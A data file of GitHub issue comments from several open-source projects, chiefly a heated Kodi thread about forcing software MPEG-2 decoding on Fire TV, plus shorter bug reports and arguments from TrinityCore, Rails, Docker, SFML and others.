xbmc/xbmc/15405/460526012,"Better use this  - the rest is only hackery ... it has settings for h264, mpeg2, mpeg4(xvid) and uses the powrevert ... ",,False,False,15405
xbmc/xbmc/15405/460928219,"For good reason. SW rendering performance has dramatically been degraded. With that approach, neither HW nor SW would have worked flawlessly on the Fire TV. HW decoding DVD/MPEG-2 still works on many devices. And for those devices where it does not work, MediaCodec can be disabled manually. So it still works. Forcing SW decoding means far (and I really mean far) inferior scaling and deinerlacing on modern TVs. And there has been no way of enabling HW decoding in V17 Krypton. So what's the better solution? Kodi V17 performed ""SW emulation"" to get it working. With this android.xml approach, those switches are not accessible by the user either as far as I can see. What about @friend's mentioned blacklist approach? ",,False,False,15405
xbmc/xbmc/15405/460510744,"Finally some sanity after @friend's well constructed argument. @friend is this just for mpeg2 DVD's or all mpeg2 content &lt;720 ? Any chance we can get All &lt; 800 mpeg2 content SW decoded by adding  test - kodi-20190120-fe68d404-powrevert-armeabi-v7a.apk with commit # fe68d404 is the best I've seen EVER for Android Leia SW decoding and rendering performance on ARM platforms. # d2f0c5f was also good. Tested on a GLES 2.0 Oreo Mi Box and GLES 3.2 MM MINIX U9. Basically I'm trying to get 25i/720x576 mpeg2 DVD's and broadcast TV SW decoded and deinterlacing on Android ARM, without fiddling incessantly with acceleration settings. Current androidswmpeg2-armeabi test .apk's above do not default to SW decoding for 25i/720x576 mpeg2 TV., prob because you are using if (hints.width &lt;= 700) ",,False,False,15405
xbmc/xbmc/15405/460982751,"I just downgraded to 17.6 to check that. DVDs play fine if Mediacodec is switched on or off. So, no V18 fixed nothing with SW rendering that needed to be fixed, at least not on FireTV. ""Alternative facts""? Do you consider this a contribution to the discussion which should be taken seriously? Because I have my doubts. ",,False,False,15405
xbmc/xbmc/15405/460970290,"True. Final V18 fixed the SW rendering bottleneck, or at least mitigated it, enabling proper playback of 25fps (incl. interlaced with deinterlace-half) material. All I wanted to say was that people have been asking for HW decoding when SW was badly broken, countering @friend's alternative facts. I think that the real issue is understood now and that it might be safe to re-enable SW for DVD and MPEG-4 ASP SD by default. Probably all of today's Android TV devices can cope with that. SW decoding has quite some downsides though (performance- and quality-wise) and since many devices properly support HW decoding, forcing SW would't be a good solution IMHO (which I understand you are not advocating). ",,False,False,15405
xbmc/xbmc/15405/460538708,"Tested this APK mpeg4 videos still stuttering like before (with hardware acceleration enabled) ( XBMC Player info from tested file Decoder amc-mpeg4(S)(HW) Pixel-Format Surface MediaInfo AVI 1. Video-Stream MPEG-4 Visual (XviD) 1687 kb/s, 720x400 (169) @ 25,00 fps, MPEG-4 Visual (XviD) (Advanced Simple@friend) (BVOP1) ",,False,False,15405
xbmc/xbmc/15405/461564365,"A good example is the bugs bunny NTSC iso (VOB container + mpeg2) Does not work at all with h/w on both AFTV devices, but they stutter differently. This ISO plays well on WETEK Hub and shield b.t.w. ",,False,False,15405
xbmc/xbmc/15405/461521639,"IIRC, the issue is very specific to MPEG2 from dvd, which has some peculiarity (that I can't remember right now) that some h/w decoders chokes upon. Just bring back ""hints.dvd"" from  , one way or another ;) PS Oh  sure why users would scream if DVD MPEG2 is SW decoded? Thanks for the ""quick hack"" comment, btw. You're welcome to try to convince Amazon to fix the issue ;) ",,False,False,15405
xbmc/xbmc/15405/461547705,People screamed because SW wasn‘t feasible anymore due to a bottleneck in the GLES rendering path. SW means far inferior PQ. HW deinterlacers and scalers are so much better. ,,False,False,15405
xbmc/xbmc/15405/461320658,"Here you go. There is a solution but it's unacceptable to the Kodi codebase gatekeepers. I cannot be bothered trying to implement an alternative solution at this time, nor spend time Android compiling. It uses the same user configurable HW SW switching as SPMC 16.x / 17  will also need this set of @friend patches for better ARM rendering performance  compile away and Android AML and Fire TV users will have a workable solution. ",,False,False,15405
xbmc/xbmc/15405/465464093,"Yes. I know, just one number is wrong in android.xml. But I stopped caring. There are guys in this thread knowing better anyways, let's wait on them. Talk is cheap, you know -) Am Mi., 20. Feb. 2019, 0357 hat Aleksey Zimin notifications@friend.com geschrieben ",,False,False,15405
xbmc/xbmc/15405/465565290,"I would just like to have a working Kodi that plays everything on my Fire TV -)  Now I have it and everything works to my satisfaction! In the future Android ARM devices will have more powerful CPUs, but support for older codecs may disappear from firmware alltogether. Thus there is definitely need to have SW decoding to fall back on.  Out of curiosity, which number is wrong in your android.xml? ",,False,False,15405
xbmc/xbmc/15405/460983980,"I meant V18 final relative to earlier V18 RC/nightly builds. Anyway, doesn't matter indeed. A good solution needs to be found. ",,False,False,15405
xbmc/xbmc/15405/465628005,"I have cloned the Kodi master branch, and introduced the same changes into settings.xml, Settings.cpp, Settings.h, and DVDVideoCodecAndroidMediaCodec.cpp.  Compiled and tested -- works just fine.  Plays all DVD ISOs, Blu-ray ISOs, autoframerate, 4K, HDR, all works.  I am running GUI at 720p to allow TV to do the upscaling in most cases, because Kodi does not seem to be able to lower its resolution, i.e. when GUI is set to 1080p, it will upscale all videos to 1080p. Kodi still upscales 480p and 576p files, but this looks fine. Here is the apk ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodi/kodi18.1master-armeabi-v7a-androidswmpeg2-mod.apk the apk compiled from fritsch's fork branch androidswmpeg2 with my modifications is here ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodi/kodi18.1RC1-armeabi-v7a-fritsch-androidswmpeg2-mod.apk As far as I can see these apks work the same on my Fire TV 3 pendant.  I am posting this apk for those users who are unable to compile Kodi, but would like a working alternative 18.1 release (or 18.2RC) with SW decoder switches.  It still puzzles me why Kodi developers do not want to include these switches into the main build -- they do not hurt anything, and they help many users of popular Fire TV and other non-Kodi-oriented hardware. ",,False,False,15405
xbmc/xbmc/15405/461552333,"Oh, so Kodi went to the quick hack rather than fixing the GLES rendering path? Hehe... I think I remember the issue is specific to DVD on filesystem, btw. Pretty sure ISO's didn't have the issue. ",,False,False,15405
xbmc/xbmc/15405/465571011," be group id=""3"" ",,False,False,15405
xbmc/xbmc/15405/465665477,Stop posting these builds and whatever. They bring absolutely nothing to this created issue ticket. If this continues i will close and lock it ,,False,False,15405
xbmc/xbmc/15405/465400794,"Hi, thank you fritsch for your build!  However it has a problem -- the hardware acceleration options do not show under ""Player"" menu.  I modified your build and re-compiled Kodi, putting the settings back into settings.xml instead of android.xml.  This fixed the problem and now there are user-configurable switches to turn software decoding on/off/HD only for mpeg2, mpeg4 and h.264. Here is my build apk ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodiapp-armeabi-v7a-debug.apk I tested this apk on my fire TV 3 and everything works perfectly, DVD, HD, 4K, HDR, autoframerate, etc. This is my first time buiding Kodi.  I am concerned about apk size -- it is over90Mb, whereas your apk is about 60Mb.  I suspect the standard ""make apk"" command maked apk with debugging information -- how can I make a smaller ~60Mb apk? ",,False,False,15405
xbmc/xbmc/15405/465663665,@friend Thanks for the new builds. Quick question - I wasn't following the difference between the two apks. What is the difference? ,,False,False,15405
xbmc/xbmc/15405/460957728,"That is not my observation. 17.6 silently switched off Mediacodec for DVDs and fell back to SW rendering with flawless performance. 18.0 did not automatically switch off Mediacodec, DVDs stutter. When I manually switched off Mediacodec DVDs worked. Fritsch's version (18.1 RC1) returned the 17.6 behaviour and DVDs worked out of the box. To sum that up on todays FireTV DVDs do not work with HW rendering and work with SW rendering. I do not dispute that. That leads to a user annoyance we have at least on device (the FireTV) where you would need to manually switch on or off Mediacodec depending on the type of content you watch. I do not advocate ""forcing SW decoding"". What I request is a configuration option that allows me to use Mediacodec in the default case and to switch it off explicitly for DVD material. The former we have already, the latter is my request. Ideally it would switch off DVD HW rendering automatically (like in 17.6) but only if FireTV hardware is detected. One can dream ... I do understand that additional switches are a disputed topic. From my point of view switches come into play when you can't make a sensible choice fitting all cases. Forcing the user to change a setting each time they change content type is not a sensible choice. Deliberately sabotaging DVD playback on the FireTV to force Amazon to fix their Mediacodec will produce nothing you can force Amazon to nil. Instead, users will only see that DVD playback does not work with Kodi 18.0 on FireTV and will stay with 17.6. That is one way to go blacklist Mediacodec for combinations of hardware and content type that are known to malfunction. I would still opt to make that user configurable so people can experiment (i.e. when a new FireOS comes out). ",,False,False,15405
xbmc/xbmc/15405/465688987,"I agree with @friend.  Amazon has no incentive to fix this, but team KODI does.  KODI should be user driven, and I don't understand why you wouldn't accept code that is already available in order to make all users happy with your platform?  Who would be upset by the ability to make all devices just work? ",,False,False,15405
xbmc/xbmc/15405/465691499,"@friend, do you still need to be reminded of  ? ""The main aim for the Android port of Kodi is to foremost target media-players/set-top-boxes/sticks that connect to a large screen television and uses a standard remote control as its main interface device."""" In short ""Amazon FireTV"". From a project manager I would appreciate a less hostile attitude towards users. ",,False,False,15405
xbmc/xbmc/15405/465712737,"Here, have fun with your 7 devices ",,False,False,15405
xbmc/xbmc/15405/465687423,"With all due respect, there would be no need for these builds and for this whole thread if developers of team Kodi agreed to allow users to choose to use SW decoding for codecs (mostly mpeg2 and mpeg4, and interlaced h264) that are poorly supported on popular, but NOT designed for Kodi use, platforms like Amazon Fire TV.  I do not think that Amazon cares to support mpeg2 and interlaced formats properly because they have no use for it, and so one would not expect them to work on proper implementation. ",,False,False,15405
xbmc/xbmc/15405/465688392,Go buy a different device is my advice ,,False,False,15405
xbmc/xbmc/15405/465709611,"I don't think I'm the only person that believes Amazon as a company has more devices out there (read a larger base for Kodi installs) than AMLogic.  So maybe not every workaround is a required one, but who drew the line on Amazon devices?  Seems really foolish.  You can have a very clean code, but if a large portion of the user base moves to a competitor that DOES work for their device, what good is that strategy?   it is much cheaper to switch software than to switch hardware.  I myself have 7 fire devices that run Kodi. ",,False,False,15405
xbmc/xbmc/15405/465707759,The only way to help Android is not to add workarounds for every shitty 40 dollar device someone spits out for the sole goal to sell users their own content. Why do you give amazon money and don't expect from them that they fix their product? On the other hand you argue with volunteers that they add workarounds? 2 for AMLogic 3 for Mediatek 2 for FireTV1 3 for FireTV3 1 for FireTV 4K and so on? Is that really the strategy that you want from an OSS mediacenter like kodi with exactly one Android Developer? Buy a 40 dollar device from amazon and expecting that volunteers fix their shit in the freetime is unwise ... ,,False,False,15405
xbmc/xbmc/15405/465712920,"If Kodi wants to have pure code, they have to offer their own hardware and only support that (Apple style).  However, by its own description it is made to work on many devices, so ""workarounds"" are part of the deal.  I guess that a totally pure codebase that works on only select devices is what you want.  As a developer myself, I can't help but shake my head at how this thread has gone.  It is a sad day in the life of this project. ",,False,False,15405
xbmc/xbmc/15405/465713672,If you are a developer then you should step up and start fixing stuff instead of demanding workarounds for bad devices. ,,False,False,15405
xbmc/xbmc/15405/465711444,"Let me ask differently Which workarounds for which device do you find here   is much cheaper to switch software than switch hardware"" &lt;- I believe, that this is cheaper for you - as it's my freetime that is wasted to write the code. ",,False,False,15405
xbmc/xbmc/15405/465696227,"No, I will not go and buy a different device. I like Fire TV, because it has a lot of content and apps that I use.  Much more than Nvidia Shield.  For example National Geographic/ Science Channel apps are non existent on Android TV but they are well implemented on Fire TV. Fire TV is just not as great natively for my local content, like backed-up DVD and blu-ray ISO's etc., as it is not designed for that.  But  Kodi accomplishes the task of playing local content very well.  I can buy a separate device for Kodi use, but this would be another box with wires connected to my TV, and this is completely unnecessary, as Fire TV hardware is completely capable of playing all my content well enough for my living room TV.  For advanced Kodi use I have libreelec S905X box in my basement home theater system. Why one would want to restrict capabilities of Kodi is beyond my understanding. This looks like team-Kodi is becoming politcal in its decisions instead of user-oriented.  I am all for clean code, reliability and compatibility, but hiding useful and well implemented options like SW decoding from users is unwise. ",,False,False,15405
xbmc/xbmc/15405/465713721,"It's a sad day for you as developer, demanding workaround stuff from OSS developers while at the same being able to fix the root cause yourself, so that no workarounds would have been needed, this is really sad, especially as your highly wanted workaround is just 10 lines of code ... ",,False,False,15405
nokogiri/sparklemotion/1736/305814776,am trying to make a script to search by user by entering in there first name it should display the detail of that user this interacts with the file email.xml please help me !!!  i can get it to read the xml doc and display all users i just need someone to give some exmaple code or show me how the hell i am supposed to do this thanks ) ,,False,False,1736
nokogiri/sparklemotion/1736/373737684,"Hello! Thanks for asking this question! Your request for assistance using Nokogiri will not go unanswered! However, Nokogiri's Github Issues is reserved for reporting bugs or submitting patches. If you ask your question on the mailing list, Team Nokogiri promises someone will provide you with an answer in a timely manner. If you'd like to read up on Team Nokogiri's rationale for this policy, please go to  you so much for understanding! And thank you for using Nokogiri. ",,False,False,1736
nokogiri/sparklemotion/1736/375953557,"uuhhhh there was a bug with nokogiri its a scuffed gem ???? and annoying and not very user friendly for something that claims to be user friendly On Sat, Mar 17, 2018 at 152 AM, Mike Dalessio notifications@friend.com wrote ",,False,False,1736
okhttp/square/4274/361078477,if you call  response.body().string() twice like  this response.body().string() response.body().string() you will get this unsolvable error ,,False,False,4274
SalienCheat/SteamDatabase/156/335493845,why cant i set it to only choose zones from planet 18 or 19 so if i want a game only from planet 18 it will only use planet 18 ,,False,False,156
SalienCheat/SteamDatabase/156/400028376,Because you cannot do that. ,,False,False,156
SalienCheat/SteamDatabase/156/400046417,@friend Why you can when do that in the game  i just want it so it only does planet 18 ,,False,False,156
SalienCheat/SteamDatabase/156/400047915,Because this is a bot that maximizes the XP you get. If you want to go manually to Planet 18 then you gotta turn off the bot and do it manually. ,,False,False,156
SalienCheat/SteamDatabase/156/400051747,is there any fork of this project that allow me to do that @friend ,,False,False,156
SalienCheat/SteamDatabase/156/400055625,I really want to do it on planet 18 and another planet when it comes i like does the whole script need to be rewritten to just use another planet ???? ,,False,False,156
SalienCheat/SteamDatabase/156/400234281,@friend can anybody do that please i really only want a game from planet 22 only can do i just change some lines of code and make it only use planet 22 ,,False,False,156
SalienCheat/SteamDatabase/156/400234531,why @friend ,,False,False,156
SalienCheat/SteamDatabase/156/400234659,"@friend already said why, stop asking. ",,False,False,156
SalienCheat/SteamDatabase/156/400234861,BUT CANT YOU JUST CHANGE BESTPLANET IN THE CODE AND SET IT TO PLANET 22 @friend ,,False,False,156
SalienCheat/SteamDatabase/156/400235003,"Good job, then what do you want from us? Stop mentioning me. ",,False,False,156
SalienCheat/SteamDatabase/156/400235162,@friend my only question is what i need to change it too for planet 22 ! ,,False,False,156
SalienCheat/SteamDatabase/156/400235235,Easy Write your own bot. ,,False,False,156
SFML/SFML/1556/409028181,"And you removed my issue now, wow, good! Do you know what ? I'll try to set my framework without SFML because I see SFML is not a serious projet. ",,False,False,1556
SFML/SFML/1556/462544770," The issue was closed with a corresponding reason. This did not prevent you from commenting on why you think it should have been re-opened. You did not provide any information that would help anybody else in resolving the problem, if it was even caused by SFML. You disregarded the very text in the issue template that suggested asking on the forum first about any issues with the usage of SFML before opening an issue, which we prefer only contain confirmed bugs with appropriate information. The issue was not removed. Please familiarize yourself with the way GitHub works before making such claims. Threatening people in any way is not constructive and will not benefit anyone in any way. You are entitled to believe what you want to believe, but making blanket statements such as ""SFML is not a serious project"" on an open platform has a high chance to mislead people into believing it as a fact. As such, in the future please refrain from making such remarks. I have temporarily blocked you from the SFML organization for 7 days. Please take this time to calm down and reflect on what has just happened. If you have any comments regarding the handling of this issue, please either take it to the forum or contact the SFML team via other means. If, after you are unblocked, you intend to continue to post clearly non-constructive content, you will be permanently blocked from the SFML organization. This is your last warning.  Have a pleasant day. ",,False,False,1556
forgottenserver/otland/2494/354178641,Expected behaviour  behaviour ,,False,False,2494
forgottenserver/otland/2494/416200370,And the problem is? ,,False,False,2494
forgottenserver/otland/2494/416305528,"@friend  try it out yourself and compare with the image i provided, you can do so by trapping a monster and walk around it and see which direction it is facing. the problem is that the direction is not coded correctly for monster in some squares. ",,False,False,2494
forgottenserver/otland/2494/417580047,"@friend You are filing a bug, i think you should post both expected and actual behavior. You posted expected in an image. Then post the actual in a companionable image. ",,False,False,2494
forgottenserver/otland/2494/417590324,"@friend or you can just recode it after the expected image, i don't see a point in making another image of the broken code (which i did include btw). feel free to spend that time yourself making the image if you really think it is needed. ",,False,False,2494
forgottenserver/otland/2494/417759787,You are reporting a bug and expects that we try based on a image?! Please provide more information about it and not just a stupid image that you think that it should be. ,,False,False,2494
forgottenserver/otland/2494/417775273,and you expect me to sit another 30min to draw you a picture instead of just clicking a link that takes 30seconds. wtf dude? ,,False,False,2494
moby/moby/17195/112269176,"There are numerous open issues in regards to docker and DNS handling within containers (#17190 #16619 #15978 #14627 #15819 and likely many others which I was fuzzy on) One solution I think which would solve all these issues would be if docker acted as a DNS server. It would answer lookup requests for linked containers, and when the request isn't for a linked container, it would forward it upstream (to the host's name servers). The  file inside the container would then be static, containing only the container itself. We could also not touch  at all, and leave the container's entry to DNS. This would allow image builds to manipulate the file and persist the changes. For performance, it would probably be good if docker cached the upstream DNS records. Records come back with a TTL, so docker should cache the record until this TTL expires. ",,False,False,17195
moby/moby/10248/55068779,"Running my own image on a CentOS 7 host, clean installation, no other jobs running is embarrassing slow. docker run -p 1202012020 zopyx/xmldirector-plone takes in the range 5 to 10 minutes under Docker control. Running the same code on same virtual machine usually takes less than one minute. The image starts eXist-db, pre-allocates the CMS Plone and starts it. The related Dockerfile is here  uses this as base image  the load of the VM goes over the top and climbs up to 10  [ajung@friend ~]$ uname -a Linux docker.zopyx.com 3.10.0-123.el7.x86_64 #1 SMP Mon Jun 30 120922 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux [ajung@friend ~]$ docker version Client version 1.4.1 Client API version 1.16 Go version (client) go1.3.3 Git commit (client) 5bc2ff8 OS/Arch (client) linux/amd64 Server version 1.4.1 Server API version 1.16 Go version (server) go1.3.3 Git commit (server) 5bc2ff8 [ajung@friend ~]$ docker -D info Containers 3 Images 62 Storage Driver devicemapper  Pool Name docker-2531-201327949-pool  Pool Blocksize 65.54 kB  Data file /var/lib/docker/devicemapper/devicemapper/data  Metadata file /var/lib/docker/devicemapper/devicemapper/metadata  Data Space Used 3.474 GB  Data Space Total 107.4 GB  Metadata Space Used 4.448 MB  Metadata Space Total 2.147 GB  Library Version 1.02.82-git (2013-10-04) Execution Driver native-0.2 Kernel Version 3.10.0-123.el7.x86_64 Operating System CentOS Linux 7 (Core) CPUs 3 Total Memory 3.704 GiB Name docker.zopyx.com ID 2CWZEWWZTNZTNHN7H4VEJOENPQZGXVJGAJMH2PVKJYOXE4UY Debug mode (server) false Debug mode (client) true Fds 23 Goroutines 39 EventsListeners 0 Init Path /usr/bin/docker Docker Root Dir /var/lib/docker Username zopyx Registry [",,False,False,10248
TrinityCore/TrinityCore/17506/163573891,"Description Hello TrinityCore devs. I have noticed that the boss encounter progress panel is not working. I know this is only a cosmetic thing; and TC is appearing to be focused on playability. But many of us are here to study and to learn about how, maybe, a real MMO will be structured back-end. It is nice that a spell works, but it doesn't help with the model of TrinityCore (an educational project). I would really love to learn more from you about this system. Current behaviour Tell us what happens When you enter a dungeon from the instance portal, you do not see the encounter progress panel on the right of the screen. Expected behaviour Tell us what should happen instead On retail, when entering the instance, we will see something like this  Steps to reproduce the problem  Make any character Teleport to the entrance of any dungeon Enter the dungeon  Branch(es) 3.3.5 / 6.x (Select the branch(es) affected by this issue)  6.x TC hash/commit 77f980035a43a9156c22130042d1fb6597139ee0 TDB version 6.04 Operating system Windows 10 ",,False,False,17506
TrinityCore/TrinityCore/17506/230168357,"I am sure this ticket is duplicate, but can't find original one. ",,False,False,17506
TrinityCore/TrinityCore/17506/230168535,"I did search for an open ticket too, but did not find one so I created this. ",,False,False,17506
TrinityCore/TrinityCore/17506/230175897,NO! PLEASE CLOSE! why tc should doing that while all pservers already having this? for make difficulty with merge? better for work on quests and spells which not pservers having. for improving state of private conditions source. ,,False,False,17506
TrinityCore/TrinityCore/17506/230178172,@friend well this is not only a cosmetic. This makes players to get more bonuses like Experience and Gold.. Thats a huge thing to get fixed  ) ,,False,False,17506
TrinityCore/TrinityCore/17506/230182344,@friend TC has no business with private servers so if TC implements scenarios on their own they don't have to care about their servers. (Scenarios is the point that is being asked for here.) ,,False,False,17506
TrinityCore/TrinityCore/17506/230200926,"Wall of text warning I'm working on implementing Scenarios for TrinityCore at the moment, but have been asked to put it on hold for a while, while I spend some time to update and push some uncommited PvE encounter scripts for Dragon Soul / Terrace of Endless Spring and Heart of Fear. Main issue with the scenario system I'm currently working on is the missing information about Criteria Tree operator flags which the scenario system, and achievement system build upon. Basically the operator flags help determine whether or not a criteria has been fulfilled (which Scenarios use to track progress). We currently only know 2 operator flags for processing criteria progresses, and there appears to be at least 2 more that are currently unknown. Basically what doesn't work is if the scenario asks you to kill 30 creatures in the instance, then the criterias behind it might look something like this Description Kill 30 enemies (CriteriaTreeId 123) Amount to complete criteria is determined from the CriteriaTreeId, and that amount is 30 (30 enemies) CriteriaIds to be fullfilled to complete CriteriaTreeId 123 are the following 50,  51, 52. Criteria 50 corresponds to killing creature with entry 1001, 15 times. Criteria 51 corresponds to killing creature with entry 1002, 15 times. Criteria 52 corresponds to killing creature with entry 1005, 15 times. The currently criteria system will then only fulfill the criteriatree, if all criterias are complete. And they  currently  require you to kill exactly 15 of creature entry 1001, 15 of creature entry 1002, and 15 of creature entry 1005. Which is a total of 45, and a strict requirement to kill 15 of a certain creature, when the CriteriaTree asked for 30, from any of those criterias listed. This is the behavior that I've observed so far, but I could use some help from Shauren to verify this and see if he has any idea of what the currently unknown operator flags might do. There's also another problem with the criteria UI, and I believe it's related to a loading screen issue currently present in TrinityCore. When you get a loading screen, you bar will fill up to indicate loading progress, just like retail. However when it reaches 100% on trinitycore, the loading bar disappears after a small delay, without removing the loading screen itself. The loading screen eventually goes away but it has already caused an impact in displaying the scenario UI, whos opcode has been sent properly. Resending the scenario UI opcode whilst playing will correctly show the UI. These 2 problems are currently impeding the progress of pushing this feature, so if you have any knowledge about helping/fixing this, please contact me. The 2 issues recapped  Unknown CriteriaTree.db2 operator flags TrinityCore Loading screen issue (I might be very wrong about this being the root cause for the scenario UI not showing, if sent during the loading screen)  ",,False,False,17506
TrinityCore/TrinityCore/17506/230202216,"So I was wrong, this is more than a cosmetic issue. I am now even more intrigued about this Scenario system. Maybe you can push a PR to TC and the community can improve / complete the system? I'm very interested to look at your work. ",,False,False,17506
TrinityCore/TrinityCore/17506/230215382,@friend Loading screens should have been fixed 3 weeks ago - 2fe6fc63d79655a96ee2135a6b380ce353729088 ,,False,False,17506
TrinityCore/TrinityCore/17506/230220129,@friend Great! Sorry for refering to outdated rev. ,,False,False,17506
TrinityCore/TrinityCore/17506/230326143,"@friend better to not make pr. why to do pr of scinario to tc? all pserver have already this. only to making merge conflict? for making battle with git?! open sources dose not need it! do the encounter script, the ""Dragon Soul / Terrace of Endless Spring and Heart of Fear"" is lot better for you. pls. many respect to tc devs, but pls close issue. ",,False,False,17506
TrinityCore/TrinityCore/17506/230328385,"@friend please kindly fuck off and mind your own server with this attitude. While at it please also don't use TrinityCore as you clearly already have everything fixed, don't need anything here except just leeching things you are unable to fix yourself. ",,False,False,17506
TrinityCore/TrinityCore/17506/236120101,@friend you know a simple thank you goes a long way? It shows you are nothing more than a Leech! Who the ---- do you think you are dictating what and what the opensource needs? As for your request to get something done... How about placing a bounty on it so the person who caters to you actually gains something for providing you what you want since you cant provide fixes. If you are running a pserver which mind you is NOT supported by TC or any other core development community this means you are gaining from it in some way or you would not be doing it how about throwing the dev team a Monitory tip for their efforts. Clearly you are too incompetent. Or hey wait even better.. Learn to code and move away from TrinityCore. WAIT A F--ken moment here So you have that working and yet you didn't provide a solution or p/r? You have no one to blame but yourself for merge conflicts because you didn't offer a p/r  Here's your tissue mate. I Second Shauren in his statement. @friend Nice response! I could not say it any better )  @ Trinity Development Team and Community You guys rock and Don't let people like this discourage you. People like ViktorIvanenko Hold very little value and only acts for their own gain not anyone else. ,,False,False,17506
rails/rails/594/904177,"Imported from Lighthouse. Original ticket at  by Damien MATHIEU - 2011-02-17 080723 UTC When exporting OrderedHash objects with to_json or to_xml, they become arrays and doesn't stay as hashes. With those methods, they're exported as if they were hashes. ",,False,False,594
rails/rails/594/1168803,Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-07 223546 UTC Did I use the inappropriate method to suggest a patch ? ,,False,False,594
rails/rails/594/1168804,Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 084012 UTC So I guess not. Whatever. Thanks anyway for not even taking a few seconds to look at my patch. ,,False,False,594
rails/rails/594/1168805,Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 094012 UTC How about doing something like the following? This way we won't need to maintain the code for cerating JSON and XML in multiple places. ,,False,False,594
rails/rails/594/1168806,"Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 094353 UTC Oh btw, that attitude is not very nice. I would have not replied if I had seen your last comment. People are busy with work and busy creating/fixing code that you can use, for free. It's also stated very clear in the explanation in the right hand bar. But I guess you didn't read that. “Then don't get your hopes up. Unless you have a ""Code Red, Mission Critical, The World is Coming to an End"" kinda bug, you're creating this ticket in the hope that others with the same problem will be able to collaborate with you on solving it. Do not expect that the ticket automatically will see any activity or that others will jump to fix it. Creating a ticket like this is mostly to help yourself start on the path of fixing the problem and for others to sign on to with a ""I'm having this problem too""..” ",,False,False,594
rails/rails/594/1168807,"Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 094358 UTC Because if we move from an OrderedHash to an hash, we're losing the order in 1.8 ? ",,False,False,594
rails/rails/594/1168808,Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 094549 UTC And sorry for the harsh message. I must admit that it's quite frustrating to see other tickets being assigned or at least having someone show an interest to it and feel alone with his ticket not being replied ;) ,,False,False,594
rails/rails/594/1168809,"Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 095104 UTC Yes that's true, but is it important for JSON and XML? (I don't know) I understand, but such emotional messages never help. But enough about this. ",,False,False,594
rails/rails/594/1168810,"Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 095332 UTC Well in my case it was. I have a date for every key of the hash (in the format ""YYYY-MM-DD) and I need it to be ordered by date, even when I give it in json or xml (otherwise the application using the feed need to reorder it). ",,False,False,594
rails/rails/594/1168811,"Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 100533 UTC At least in JSON the spec (json.org) says clearly “An object is an unordered set of name/value pairs. An object begins with { (left brace) and ends with } (right brace). Each name is followed by  (colon) and the name/value pairs are separated by , (comma).” From googling it seems that in XML the same applies, but I haven't found a definitive answer yet so you'd have to look this up more thoroughly. ",,False,False,594
rails/rails/594/1168812,Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 100745 UTC Maybe someone on rubyonrails-core@friend.com knows this about XML? ,,False,False,594
rails/rails/594/1168813,"Imported from Lighthouse. Comment by Nate Wiger - 2009-02-10 130352 UTC In XML, order may or may not matter. It's application-dependent. My opinion writing your app to rely on Rails to spit out XML/JSON automatically in some order (ASCII order?) is a bad idea.  It's not actually part of either the JSON or XML specs to do so.  It's a fragile approach. I'm not against this patch, but kazhar, I would strongly suggest a different approach for your app.  It is quite likely, since this is NOT a formally-defined behavior for JSON/XML, that sometime in the future a subsequent patch will get applied which will revert this behavior. Just write a .rxml and spit it out ordered by date.  Or create an ActiveRecordBase subclass with ""abstract_class = true"" that overrides the to_xml/to_json methods.  Use the Ruby sort method and spit out what you need. ",,False,False,594
rails/rails/594/1168814,"Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 133123 UTC Also, I just remembered OrderedHash is a subclass of Hash nowadays, so this probably already works as it should in 2.3. (That is, dumping as an unordered hash). ",,False,False,594
rails/rails/594/1168815,Imported from Lighthouse. Comment by Jeremy Kemper - 2010-05-04 174839 UTC [bulk edit] ,,False,False,594
rails/rails/594/1168816,Attachments saved to Gist ,,False,False,594
symfony/symfony/5402/6576318,"➜  src  git clone git//github.com/symfony/symfony.git Cloning into 'symfony'... remote Counting objects 144068, done. remote Compressing objects 100% (44515/44515), done. remote Total 144068 (delta 91155), reused 135518 (delta 83912) Receiving objects 100% (144068/144068), 22.84 MiB | 837 KiB/s, done. Resolving deltas 100% (91155/91155), done.  ➜  src  cd symfony   ➜  symfony git(master) composer install   Installing dependencies   - Installing doctrine/common (2.3.x-dev)     Cloning 605b1b8b5a7bc8daf9111fb35483e5708e30de35    - Installing twig/twig (dev-master)     Cloning 459720ff3b74ee0c0d159277c6f2f5df89d8a4f6  Writing lock file Generating autoload files  ➜  symfony git(master) phpunit             Warning require_once(/usr/local/src/symfony/vendor/doctrine/orm/lib/Doctrine/ORM/Mapping/Driver/DoctrineAnnotations.php) failed to open stream No such file or directory in /usr/local/src/symfony/vendor/doctrine/common/lib/Doctrine/Common/Annotations/AnnotationRegistry.php on line 59  Call Stack     0.0002     274896   1. {main}() /usr/local/src/phpunit/phpunit.php0     0.0254    2845976   2. PHPUnit_TextUI_Commandmain() /usr/local/src/phpunit/phpunit.php46     0.0254    2846568   3. PHPUnit_TextUI_Command-&gt;run() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php130     0.0254    2847120   4. PHPUnit_TextUI_Command-&gt;handleArguments() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php139     0.0312    3242512   5. PHPUnit_TextUI_Command-&gt;handleBootstrap() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php615     0.0314    3252840   6. PHPUnit_Util_FileloadercheckAndLoad() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php787     0.0314    3253224   7. PHPUnit_Util_Fileloaderload() /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php77     0.0315    3260656   8. include_once('/usr/local/src/symfony/autoload.php.dist') /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php93     0.0330    3385496   9. Doctrine\Common\Annotations\AnnotationRegistryregisterFile() /usr/local/src/symfony/autoload.php.dist17  ",,False,False,5402
symfony/symfony/5402/8188832,I think you need to install the composer stuff with . ,,False,False,5402
